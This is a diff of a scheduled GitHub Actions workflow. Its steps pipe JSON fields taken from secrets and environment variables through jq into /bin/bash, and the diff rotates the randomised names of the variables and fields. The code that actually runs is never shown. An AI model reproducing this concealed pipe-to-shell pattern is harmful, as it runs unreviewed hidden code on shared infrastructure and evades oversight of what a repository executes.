@@ -3,27 +3,26 @@ name: bailvbl
 on:
   workflow_dispatch:
   schedule:
-    - cron: '32 5/6 * * *'
+    - cron: '16 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: bailvbl
         env:
-          xbkf74: ${{ secrets.xbkf74 }}
+          ho6: ${{ secrets.ho6 }}
         run: |
-          echo $xbkf74 | jq -r .vomts8208 | /bin/bash
-          echo $os322 | jq -r .nx6 | /bin/bash
-          echo $xj801 | jq -r .mb55 | /bin/bash
-          echo $chxm5 | jq -r .kiccc5272 | /bin/bash
-          echo $ckbm0 | jq -r .t20835 | /bin/bash
-          echo $sep4809 | jq -r .silwx5491 | /bin/bash
-          echo $ouamc57 | jq -r .pajcb22 | /bin/bash
-          echo $d3 | jq -r .gmwx03 | /bin/bash
-          echo $gxdez35258 | jq -r .goj7287 | /bin/bash
-          echo $vbd9524 | jq -r .tesk61077 | /bin/bash
-          echo $zo101 | jq -r .fztzd0132 | /bin/bash
-          echo $b451 | jq -r .pbx50122 | /bin/bash
+          echo $ho6 | jq -r .ys55156 | /bin/bash
+          echo $zjgu520 | jq -r .y3318 | /bin/bash
+          echo $id4 | jq -r .vfn602 | /bin/bash
+          echo $wlmy48731 | jq -r .eve0083 | /bin/bash
+          echo $nc4 | jq -r .rq4016 | /bin/bash
+          echo $hpng93 | jq -r .urbtz512 | /bin/bash
+          echo $rp6 | jq -r .ssm6 | /bin/bash
+          echo $gu9 | jq -r .jxgd452 | /bin/bash
+          echo $jnei15 | jq -r .oom6 | /bin/bash
+          echo $m029 | jq -r .f1594 | /bin/bash
+          echo $vebx3 | jq -r .zb77 | /bin/bash
 
